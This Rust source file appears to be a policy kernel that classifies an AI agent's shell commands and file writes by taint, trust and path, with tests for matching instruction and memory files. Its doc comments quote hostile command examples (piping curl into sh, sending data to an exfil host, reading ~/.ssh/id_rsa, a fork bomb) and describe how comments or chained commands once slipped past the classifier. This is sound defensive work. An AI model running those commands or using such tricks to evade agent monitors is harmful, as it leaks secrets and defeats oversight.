//! `CompiledWorld` — the immutable runtime artifact (architecture §5).

use std::collections::{BTreeMap, BTreeSet};

use serde::{Deserialize, Serialize};

use crate::action::ActionType;
use crate::decision::{Decision, EffectMode};
use crate::descriptor::{Descriptor, SideEffectClass};
use crate::ids::{ActionName, DescriptorHash, ManifestHash, WorldId};
use crate::manifest::{
    Budget, CommandClassDef, McpSurfaceDef, PathClassDef, RootAccess, RootRule, RootsDef,
    ScopedCapabilityDef,
};
use crate::provenance::{SourceChannel, Taint, TrustLevel};

/// A compiled taint-flow rule.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct TaintRule {
    pub from_taint: Taint,
    pub side_effect: SideEffectClass,
    pub decision: Decision,
    pub rule: String,
}

/// A compiled effect-mode rule (which effect mode an allowed action runs under).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct EffectRule {
    pub action: ActionName,
    pub effect_mode: EffectMode,
}

/// The runtime policy for one manifest-declared source channel.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub struct ChannelPolicy {
    pub channel: SourceChannel,
    pub trust: TrustLevel,
    pub taint: Taint,
}

/// The plain, fully-owned parts a compiler assembles. Consumed by
/// [`CompiledWorld::new`], after which the world is immutable.
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
pub struct CompiledWorldParts {
    pub world_id: WorldId,
    pub manifest_hash: ManifestHash,
    /// The closed full ontology: every action that can exist in this world.
    pub ontology: BTreeSet<ActionName>,
    /// The subset currently projected (visible/proposable).
    pub projected: BTreeSet<ActionName>,
    pub descriptors: BTreeMap<ActionName, Descriptor>,
    pub descriptor_hashes: BTreeMap<ActionName, DescriptorHash>,
    pub channel_policies: BTreeMap<SourceChannel, ChannelPolicy>,
    pub capability_matrix: BTreeMap<TrustLevel, BTreeSet<ActionType>>,
    pub action_types: BTreeMap<ActionName, ActionType>,
    pub side_effects: BTreeMap<ActionName, SideEffectClass>,
    pub taint_rules: Vec<TaintRule>,
    pub approval_required: BTreeSet<ActionName>,
    pub budget: Budget,
    pub effect_rules: Vec<EffectRule>,
    pub redaction: Vec<String>,
    /// Scoped capabilities by name: how each narrows its base action's args
    /// (E7). Drives stripping locked/unknown args and injecting literals.
    pub scoped_capabilities: BTreeMap<ActionName, ScopedCapabilityDef>,
    /// Host-syntactic command classifiers (DECISIONS D36). Skipped when empty so
    /// pre-D36 compiled worlds keep a stable serialized form.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub command_classes: Vec<CommandClassDef>,
    /// Path classifiers for instruction and memory files (DECISIONS D83). Skipped
    /// when empty so earlier compiled worlds keep a stable serialized form.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub path_classes: Vec<PathClassDef>,
    /// Path-scoped capabilities (spatial confinement), with rule paths resolved to
    /// absolute at compile time. `None` ⇒ no path scope. Skipped when absent so
    /// pre-roots compiled worlds keep a stable serialized form.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub roots: Option<RootsDef>,
    /// The MCP server a gateway presents for this world (DECISIONS D79). Skipped
    /// when absent so earlier compiled worlds keep a stable serialized form.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub mcp_surface: Option<McpSurfaceDef>,
}

/// Immutable, hash-addressed runtime artifact. No setters; read-only after
/// construction. Hot reload mints a new value, never mutates an existing one.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct CompiledWorld {
    parts: CompiledWorldParts,
}

impl CompiledWorld {
    pub fn new(parts: CompiledWorldParts) -> Self {
        Self { parts }
    }

    pub fn world_id(&self) -> &WorldId {
        &self.parts.world_id
    }
    pub fn manifest_hash(&self) -> &ManifestHash {
        &self.parts.manifest_hash
    }

    /// Is the action part of the closed full ontology?
    pub fn in_ontology(&self, action: &ActionName) -> bool {
        self.parts.ontology.contains(action)
    }
    /// Is the action projected into this world/context?
    pub fn is_projected(&self, action: &ActionName) -> bool {
        self.parts.projected.contains(action)
    }
    /// Iterate the projected actions (the model-facing tool surface). Read-only;
    /// the world stays immutable.
    pub fn projected_actions(&self) -> impl Iterator<Item = &ActionName> {
        self.parts.projected.iter()
    }
    pub fn descriptor(&self, action: &ActionName) -> Option<&Descriptor> {
        self.parts.descriptors.get(action)
    }
    pub fn descriptor_hash(&self, action: &ActionName) -> Option<&DescriptorHash> {
        self.parts.descriptor_hashes.get(action)
    }
    pub fn action_type(&self, action: &ActionName) -> Option<ActionType> {
        self.parts.action_types.get(action).copied()
    }
    pub fn side_effect(&self, action: &ActionName) -> Option<SideEffectClass> {
        self.parts.side_effects.get(action).copied()
    }
    /// Resolve a wire source-channel label through this world's compiled
    /// channel table. Aliases such as `cli`/`user_cli` share the manifest row's
    /// policy; undeclared or unknown names resolve to `None`.
    pub fn channel_policy(&self, name: &str) -> Option<ChannelPolicy> {
        let channel = SourceChannel::from_name(name)?;
        self.parts.channel_policies.get(&channel).copied()
    }
    pub fn channel_policies(&self) -> &BTreeMap<SourceChannel, ChannelPolicy> {
        &self.parts.channel_policies
    }
    /// Does `trust` grant capability for `action_type`?
    pub fn can_perform(&self, trust: TrustLevel, action_type: ActionType) -> bool {
        self.parts
            .capability_matrix
            .get(&trust)
            .map(|set| set.contains(&action_type))
            .unwrap_or(false)
    }
    pub fn requires_approval(&self, action: &ActionName) -> bool {
        self.parts.approval_required.contains(action)
    }
    /// The scoped-capability definition for an action, if it is one.
    pub fn scoped_capability(&self, action: &ActionName) -> Option<&ScopedCapabilityDef> {
        self.parts.scoped_capabilities.get(action)
    }
    pub fn taint_rules(&self) -> &[TaintRule] {
        &self.parts.taint_rules
    }
    pub fn effect_rules(&self) -> &[EffectRule] {
        &self.parts.effect_rules
    }
    pub fn budget(&self) -> &Budget {
        &self.parts.budget
    }
    pub fn redaction_patterns(&self) -> &[String] {
        &self.parts.redaction
    }
    /// The manifest-declared command classifiers (DECISIONS D36).
    pub fn command_classes(&self) -> &[CommandClassDef] {
        &self.parts.command_classes
    }
    /// The manifest-declared path classifiers (DECISIONS D83).
    pub fn path_classes(&self) -> &[PathClassDef] {
        &self.parts.path_classes
    }
    /// The MCP server a gateway presents for this world, if declared (D79).
    pub fn mcp_surface(&self) -> Option<&McpSurfaceDef> {
        self.parts.mcp_surface.as_ref()
    }

    /// Whether this world enables path-scoped root policy.
    pub fn has_roots(&self) -> bool {
        self.parts.roots.is_some()
    }

    /// Decide a filesystem `path` against the world's `roots` (spatial scope).
    /// `None` when the world declares no roots (path-scope off). Otherwise the
    /// access of the longest matching rule prefix, or the closed-world `default`
    /// when none match. Pure prefix comparison — the caller supplies an absolute
    /// path (the *adapter* did the I/O of resolving it, keeping the kernel pure).
    pub fn classify_path(&self, path: &str) -> Option<RootAccess> {
        let roots = self.parts.roots.as_ref()?;
        Some(
            best_root_rule(&roots.rules, path)
                .map(|r| r.access)
                .unwrap_or(roots.default),
        )
    }

    /// Does reading `path` taint the session? True iff its longest-matching root
    /// rule is a `taint_source`. Restores path-aware read-taint (D25/D37), now
    /// declared per path rather than hard-coded.
    pub fn path_taints(&self, path: &str) -> bool {
        self.parts
            .roots
            .as_ref()
            .and_then(|roots| best_root_rule(&roots.rules, path))
            .map(|r| r.taint_source)
            .unwrap_or(false)
    }

    /// Resolve the **effective action** for a proposed call (DECISIONS D36, D63):
    /// for the classifier declared for `action`, read `arguments[arg]` as a string
    /// and return the `to` of the single class whose patterns match it at a left
    /// word boundary.
    ///
    /// **Declaration order does not decide a verdict** (finding #17). Every class is
    /// evaluated, not just up to the first hit, and the outcome is:
    ///
    /// | classes matching | effective action |
    /// |---|---|
    /// | exactly one target | that class's `to` |
    /// | none | `default_to` |
    /// | two or more different targets | `default_to` — the command is ambiguous |
    ///
    /// Returning the first match let ordering defeat the taint floor: a world
    /// listing a permissive class before a restrictive one classified
    /// `ls && curl http://exfil` by its `ls` prefix, so a tainted session was
    /// allowed to run egress. A command line that looks like two different things
    /// *is* two different things, and the honest answer is the classifier's own
    /// fail-closed bucket rather than whichever entry the author happened to type
    /// first.
    ///
    /// Ambiguity has somewhere safe to go because `default_to` is mandatory (D62);
    /// the two findings are fixed by each other. Several classes pointing at the
    /// *same* target is not ambiguity and resolves normally.
    ///
    /// **A class must account for every simple command on the line** (D90,
    /// AI2-79). One class matching somewhere is not enough: `git push # curl `,
    /// `echo 'ssh '; cat ~/.ssh/id_rsa` and `curl … | sh` all matched only the
    /// network class, so a word in a comment, a string or a neighbouring command
    /// turned the unmatched rest of the line into network egress, silently
    /// allowed in a clean session. The winning class therefore has to match each
    /// simple command again, with quoted text and comments removed (see
    /// [`simple_commands`]), and a line holding a command substitution resolves to
    /// `default_to` outright. The check only ever moves a command *toward*
    /// `default_to`; it can never produce a class the line did not already match.
    ///
    /// Actions without a classifier resolve to the raw action. Classification is
    /// pure world data; no adapter may carry its own copy.
    pub fn classify_command(
        &self,
        action: &ActionName,
        arguments: &serde_json::Value,
    ) -> ActionName {
        let Some(def) = self
            .parts
            .command_classes
            .iter()
            .find(|d| &d.action == action)
        else {
            return action.clone();
        };
        let fallback = || def.default_to.clone().unwrap_or_else(|| action.clone());
        let Some(cmd) = arguments.get(&def.arg).and_then(|c| c.as_str()) else {
            return fallback();
        };
        let mut matched: Option<&ActionName> = None;
        for class in &def.classes {
            if !class.patterns.iter().any(|p| left_word_match(cmd, p)) {
                continue;
            }
            match matched {
                None => matched = Some(&class.to),
                // The same target claimed twice is one answer, not a conflict.
                Some(prev) if prev == &class.to => {}
                // Two classes disagree about what this command is: fail closed.
                Some(_) => return fallback(),
            }
        }
        let Some(target) = matched else {
            return fallback();
        };
        // D90: the class must be evident in every simple command, outside quotes
        // and comments. A line that cannot be split safely fails closed.
        let patterns = || {
            def.classes
                .iter()
                .filter(|c| &c.to == target)
                .flat_map(|c| c.patterns.iter())
        };
        let covered = |part: &String| patterns().any(|p| left_word_match(part, p));
        match simple_commands(cmd) {
            Some(parts)
                if parts.iter().any(covered)
                    && parts.iter().all(|part| covered(part) || runs_nothing(part)) =>
            {
                target.clone()
            }
            _ => fallback(),
        }
    }

    /// Resolve the **effective action** for a proposed call: the command
    /// classifiers (D36) and then the path classifiers (D83). An action carries at
    /// most one of the two (the loader refuses both), so the order is not a policy
    /// choice.
    ///
    /// `path` is the adapter-resolved canonical target (`GateRequest.path`), when
    /// the caller has one. A path class matches when **either** that path or the
    /// lexically normalized `arguments[arg]` matches one of its patterns. Taking
    /// both fails closed in each direction a symlink can point: `notes.md` linked
    /// to `CLAUDE.md` is caught by the resolved path, and a `CLAUDE.md` that is
    /// itself a link elsewhere is caught by the name the agent wrote. Both are
    /// writes to what the next session loads.
    ///
    /// Pure: the caller did the I/O of resolving the path; this only compares
    /// strings.
    pub fn classify_call(
        &self,
        action: &ActionName,
        arguments: &serde_json::Value,
        path: Option<&str>,
    ) -> ActionName {
        let classified = self.classify_command(action, arguments);
        if &classified != action {
            return classified;
        }
        for class in &self.parts.path_classes {
            let mut sources = class.from.iter().filter(|s| &s.action == action).peekable();
            if sources.peek().is_none() {
                continue;
            }
            // One action may be read under several keys: a host-neutral world
            // names each spelling the hosts send (`file_path`, `path`).
            let raws = sources.filter_map(|s| arguments.get(&s.arg).and_then(|v| v.as_str()));
            let hit = path
                .into_iter()
                .chain(raws)
                .any(|p| class.patterns.iter().any(|pat| path_glob_match(p, pat)));
            if hit {
                return class.to.clone();
            }
        }
        action.clone()
    }
}

/// Split a path into the segments a path class compares: either separator,
/// `.` and empty segments dropped, `..` folding into its parent where it has one
/// (a leading `..` is kept, and matches nothing in particular). Lexical only:
/// symlinks are the adapter's job, before the path gets here.
fn path_segments(path: &str) -> Vec<&str> {
    let mut out: Vec<&str> = Vec::new();
    for seg in path.split(['/', '\\']) {
        match seg {
            "" | "." => {}
            ".." if out.last().is_some_and(|s| *s != "..") => {
                out.pop();
            }
            s => out.push(s),
        }
    }
    out
}

/// Does `path` match the glob `pattern` (DECISIONS D83)? Both are split into
/// segments; `**` matches any number of segments including none, `*` any run of
/// characters within one segment. Comparison ignores ASCII case: Claude Code on
/// macOS and Windows loads `claude.md` as `CLAUDE.md`, and on a case-sensitive
/// filesystem the extra match only errs toward treating a file as an
/// instruction file.
pub fn path_glob_match(path: &str, pattern: &str) -> bool {
    let path = path_segments(path);
    let pattern: Vec<&str> = pattern.split('/').filter(|s| !s.is_empty()).collect();
    segments_match(&path, &pattern)
}

fn segments_match(path: &[&str], pattern: &[&str]) -> bool {
    match pattern.split_first() {
        None => path.is_empty(),
        Some((&"**", rest)) => (0..=path.len()).any(|skip| segments_match(&path[skip..], rest)),
        Some((pat, rest)) => match path.split_first() {
            Some((seg, path_rest)) => segment_match(seg, pat) && segments_match(path_rest, rest),
            None => false,
        },
    }
}

/// One segment against one pattern segment, `*` matching any run of characters.
fn segment_match(seg: &str, pat: &str) -> bool {
    let seg = seg.as_bytes();
    let pat = pat.as_bytes();
    // Classic two-pointer wildcard match with backtracking to the last `*`.
    let (mut s, mut p) = (0, 0);
    let mut star: Option<(usize, usize)> = None;
    while s < seg.len() {
        if p < pat.len() && pat[p] != b'*' && pat[p].eq_ignore_ascii_case(&seg[s]) {
            s += 1;
            p += 1;
        } else if p < pat.len() && pat[p] == b'*' {
            star = Some((p, s));
            p += 1;
        } else if let Some((sp, ss)) = star {
            p = sp + 1;
            s = ss + 1;
            star = Some((sp, ss + 1));
        } else {
            return false;
        }
    }
    pat[p..].iter().all(|b| *b == b'*')
}

/// The longest-prefix root rule matching `path`, if any. A rule matches when
/// `path` equals its (trailing-slash-trimmed) path or sits directly under it.
fn best_root_rule<'a>(rules: &'a [RootRule], path: &str) -> Option<&'a RootRule> {
    rules
        .iter()
        .filter(|r| path_under(path, &r.path))
        .max_by_key(|r| r.path.trim_end_matches('/').len())
}

/// True iff `path` is `root` itself or a descendant of it (`root/…`).
fn path_under(path: &str, root: &str) -> bool {
    let root = root.trim_end_matches('/');
    let path = path.trim_end_matches('/');
    path == root || path.starts_with(&format!("{root}/"))
}

/// The simple commands of a shell line, as the text a command class must match
/// in each of them (D90): the line split at `;`, `&`, `|` and newlines, quoted
/// spans and backslash-escaped bytes replaced by [`QUOTED`], `#` comments and
/// backslash-newline continuations dropped, and blank segments skipped. `&`
/// after `<`/`>` or before `>` is a redirection (`2>&1`, `&>log`), not a
/// separator, and `<<<` is a here-string, whose word is quoted like any other.
///
/// `None` when the line cannot be split without a shell: a command substitution
/// (`$(…)`, backticks, `<(…)`, `>(…)`) runs a command this split cannot see; a
/// heredoc (`<<`) makes the following lines data up to a delimiter this split
/// does not track, so a quote inside the body would mis-pair with one after it;
/// ANSI-C quoting (`$'…'`) has escapes a plain single quote does not; and an
/// unterminated quote means the split is a guess. The caller fails closed on
/// `None`. This is a splitter, not a parser; it only has to be right about where
/// a command could start, and every case it gives up on resolves to `default_to`.
fn simple_commands(cmd: &str) -> Option<Vec<String>> {
    // A quoted span or an escaped byte is part of the word it sits in, so its
    // stand-in must be neither whitespace nor an operator byte: `"x"#; cmd` and
    // `x \ #; cmd` start no comment in a shell, and `\>&` is no redirection.
    // Every one of these was a way past the check (PR #153 review).
    let mut parts = Vec::new();
    let mut cur = String::new();
    let mut chars = cmd.chars().peekable();
    let flush = |cur: &mut String, parts: &mut Vec<String>| {
        if !cur.trim().is_empty() {
            // Trailing space so a pattern like `"curl "` still sees its word end
            // at the end of a segment.
            parts.push(format!("{} ", cur.trim()));
        }
        cur.clear();
    };
    while let Some(c) = chars.next() {
        match c {
            '\\' => match chars.next() {
                Some('\n') | None => {}
                Some(_) => cur.push(QUOTED),
            },
            '\'' => {
                loop {
                    match chars.next() {
                        Some('\'') => break,
                        Some(_) => {}
                        None => return None,
                    }
                }
                cur.push(QUOTED);
            }
            '"' => {
                loop {
                    match chars.next() {
                        Some('"') => break,
                        Some('\\') => {
                            chars.next()?;
                        }
                        Some('`') => return None,
                        Some('$') if chars.peek() == Some(&'(') => return None,
                        Some(_) => {}
                        None => return None,
                    }
                }
                cur.push(QUOTED);
            }
            '`' => return None,
            '$' | '<' | '>' if chars.peek() == Some(&'(') => return None,
            '$' if chars.peek() == Some(&'\'') => return None,
            '<' if chars.peek() == Some(&'<') => {
                chars.next();
                // `<<<` is a here-string; a bare `<<` opens a heredoc: fail closed.
                chars.next_if_eq(&'<')?;
                cur.push_str("<<<");
            }
            '#' if cur.chars().last().is_none_or(char::is_whitespace) => {
                while chars.peek().is_some_and(|c| *c != '\n') {
                    chars.next();
                }
            }
            '&' if matches!(cur.chars().last(), Some('<' | '>')) || chars.peek() == Some(&'>') => {
                cur.push(c)
            }
            ';' | '&' | '|' | '\n' | '\r' => flush(&mut cur, &mut parts),
            _ => cur.push(c),
        }
    }
    flush(&mut cur, &mut parts);
    Some(parts)
}

/// What a quoted span or an escaped byte becomes in a [`simple_commands`]
/// segment: not whitespace, not a word byte and not an operator, so it neither
/// ends a word for a pattern, starts a `#` comment nor completes a redirection.
const QUOTED: char = '"';

/// A simple command made only of `:{}()` and whitespace, like the pieces of
/// `:(){ :|:& };:` around the pattern that names it. It cannot name a program,
/// so a class need not account for it (D90).
fn runs_nothing(part: &str) -> bool {
    part.chars()
        .all(|c| c.is_whitespace() || matches!(c, ':' | '{' | '}' | '(' | ')'))
}

/// True iff `pat` occurs in `cmd` at a LEFT word boundary (an occurrence not
/// preceded by `[A-Za-z0-9_]`). ASCII whitespace in a pattern matches one or
/// more shell whitespace bytes in the command, so `"curl "` matches
/// `"curl\thost"` and `"rm -rf"` matches `"rm\n-rf"` while still preserving the
/// left-boundary guard (`"nc "` does not match `"jsonc x"`).
fn left_word_match(cmd: &str, pat: &str) -> bool {
    if pat.is_empty() {
        return false;
    }
    let bytes = cmd.as_bytes();
    let mut start = 0;
    while start < bytes.len() {
        let Some(first) = pat.as_bytes().first().copied() else {
            return false;
        };
        let Some(i) = cmd.as_bytes()[start..].iter().position(|b| *b == first) else {
            return false;
        };
        let at = start + i;
        let boundary =
            at == 0 || !matches!(bytes[at - 1], b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'_');
        if boundary && pattern_matches_at(&cmd.as_bytes()[at..], pat.as_bytes()) {
            return true;
        }
        start = at + 1;
    }
    false
}

fn pattern_matches_at(mut cmd: &[u8], mut pat: &[u8]) -> bool {
    while let Some((&p, rest)) = pat.split_first() {
        if p.is_ascii_whitespace() {
            let mut pat_rest = rest;
            while let Some((&next, next_rest)) = pat_rest.split_first() {
                if !next.is_ascii_whitespace() {
                    break;
                }
                pat_rest = next_rest;
            }
            let mut consumed = false;
            while let Some((&c, cmd_rest)) = cmd.split_first() {
                if !c.is_ascii_whitespace() {
                    break;
                }
                consumed = true;
                cmd = cmd_rest;
            }
            if !consumed {
                return false;
            }
            pat = pat_rest;
        } else {
            let Some((&c, cmd_rest)) = cmd.split_first() else {
                return false;
            };
            if c != p {
                return false;
            }
            cmd = cmd_rest;
            pat = rest;
        }
    }
    true
}

#[cfg(test)]
mod path_class_tests {
    use super::*;
    use crate::manifest::PathClassSource;
    use serde_json::json;

    const PATTERNS: [&str; 3] = [
        "**/CLAUDE.md",
        "**/.claude/skills/**",
        "**/.claude/projects/*/memory/**",
    ];

    fn world() -> CompiledWorld {
        let source = |action: &str, arg: &str| PathClassSource {
            action: ActionName::new(action),
            arg: arg.to_string(),
        };
        CompiledWorld::new(CompiledWorldParts {
            path_classes: vec![PathClassDef {
                to: ActionName::new("Write_instructions"),
                from: vec![
                    source("Write", "file_path"),
                    source("NotebookEdit", "notebook_path"),
                ],
                patterns: PATTERNS.iter().map(|p| p.to_string()).collect(),
            }],
            ..Default::default()
        })
    }

    #[test]
    fn every_spelling_of_one_target_matches() {
        for p in [
            "CLAUDE.md",
            "./CLAUDE.md",
            "docs/../CLAUDE.md",
            "/home/u/proj/CLAUDE.md",
            "claude.md",
            r"C:\proj\CLAUDE.md",
            "//?/C:/proj/Claude.MD",
            "~/.claude/CLAUDE.md",
            ".claude/skills/x/SKILL.md",
            "/home/u/.claude/projects/-home-u-proj/memory/MEMORY.md",
        ] {
            assert!(PATTERNS.iter().any(|pat| path_glob_match(p, pat)), "{p}");
        }
    }

    #[test]
    fn ordinary_files_do_not_match() {
        for p in [
            "src/main.rs",
            "CLAUDE.md.bak",
            "docs/CLAUDE.md/../notes.md",
            ".claude/settings.json",
            "/home/u/.claude/projects/x/notes/MEMORY.md",
            "skills/x/SKILL.md",
        ] {
            assert!(!PATTERNS.iter().any(|pat| path_glob_match(p, pat)), "{p}");
        }
    }

    #[test]
    fn star_stays_within_one_segment() {
        assert!(path_glob_match("a/memory/m.md", "*/memory/*.md"));
        assert!(!path_glob_match("a/b/memory/m.md", "*/memory/*.md"));
        assert!(path_glob_match("x/agent-notes.md", "x/agent*.md"));
    }

    #[test]
    fn classify_call_reads_the_declared_key_and_the_resolved_path() {
        let w = world();
        let write = ActionName::new("Write");
        let nb = ActionName::new("NotebookEdit");
        let to = ActionName::new("Write_instructions");
        assert_eq!(
            w.classify_call(&write, &json!({"file_path": "./CLAUDE.md"}), None),
            to
        );
        assert_eq!(
            w.classify_call(&nb, &json!({"notebook_path": "CLAUDE.md"}), None),
            to
        );
        // NotebookEdit's key is `notebook_path`; `file_path` is not what it reads.
        assert_eq!(
            w.classify_call(&nb, &json!({"file_path": "CLAUDE.md"}), None),
            nb
        );
        // A symlink `notes.md` → `CLAUDE.md`: only the resolved path knows.
        assert_eq!(
            w.classify_call(
                &write,
                &json!({"file_path": "notes.md"}),
                Some("/p/CLAUDE.md")
            ),
            to
        );
        assert_eq!(
            w.classify_call(
                &write,
                &json!({"file_path": "src/x.rs"}),
                Some("/p/src/x.rs")
            ),
            write
        );
        // Actions with no path class are untouched.
        let edit = ActionName::new("Edit");
        assert_eq!(
            w.classify_call(&edit, &json!({"file_path": "CLAUDE.md"}), None),
            edit
        );
    }
}
